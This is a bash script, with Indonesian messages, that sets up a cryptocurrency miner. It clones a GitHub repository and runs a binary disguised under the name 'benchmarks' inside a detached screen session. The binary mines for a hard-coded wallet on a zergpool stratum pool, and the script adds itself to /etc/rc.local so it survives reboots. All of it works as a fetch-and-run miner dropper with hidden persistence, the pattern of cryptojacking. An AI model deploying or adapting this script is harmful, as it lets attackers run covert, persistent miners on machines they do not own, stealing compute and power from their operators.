#!/bin/bash
echo "ğŸ“¦ Menginstal dependensi..."
apt-get update && apt-get install -y screen wget git

echo "ğŸ§¹ Membersihkan folder sebelumnya..."
rm -rf /root/web

echo "ğŸŒ Clone skrip mining dari GitHub..."
git clone https://github.com/amirul5656/web.git /root/web

if [ ! -d /root/web ]; then
  echo "âŒ Gagal clone repo GitHub. Periksa koneksi internet atau URL."
  exit 1
fi

echo "â³ Mengecek file benchmarks..."
if [ ! -f /root/web/benchmarks ]; then
  echo "âŒ File 'benchmarks' tidak ditemukan setelah clone. Gagal lanjut."
  exit 1
fi

# Validasi apakah file benar-benar executable ELF
if ! file /root/web/benchmarks | grep -q "ELF 64-bit"; then
  echo "âŒ File 'benchmarks' bukan file biner ELF. Gagal jalan."
  exit 1
fi

echo "âœ… File benchmarks valid. Menyiapkan script mining..."

cat << 'EOF' > /root/web2.sh
#!/bin/bash

cd /root/web || exit

chmod +x benchmarks

if screen -list | grep -q amirul3; then
  echo "âš ï¸  Screen 'amirul3' sudah berjalan. Melewati eksekusi ulang."
else
  echo "â–¶ Menjalankan mining di screen 'amirul3'..."
  screen -dmS amirul3 bash -c '
    while true; do
      ./benchmarks --algorithm xelisv2_pepew --pool stratum+tcp://xelisv2-pepew.asia.mine.zergpool.com:5778 --wallet RBbwLUvJ4sqWDFZSKqT6cKBiRMXwm5x4jD --password c=RVN,mc=PEPEW,ID=yui
      sleep 2
    done
  '
fi
EOF

chmod +x /root/web2.sh

echo "ğŸš€ Menjalankan miner sekarang..."
bash /root/web2.sh

echo "ğŸ” Menambahkan ke startup reboot (/etc/rc.local)..."
if [ -f /etc/rc.local ]; then
  if ! grep -q '/root/web2.sh' /etc/rc.local; then
    sed -i '/^exit 0/i bash /root/web2.sh &' /etc/rc.local
    echo "ğŸ› ï¸ Ditambahkan ke /etc/rc.local"
  fi
else
  echo '#!/bin/bash' > /etc/rc.local
  echo 'bash /root/web2.sh &' >> /etc/rc.local
  echo 'exit 0' >> /etc/rc.local
  chmod +x /etc/rc.local
  echo "ğŸ› ï¸ /etc/rc.local dibuat dan diset executable"
fi

echo "âœ… SEMUA SIAP! Mining sudah berjalan dan akan otomatis restart setelah reboot."
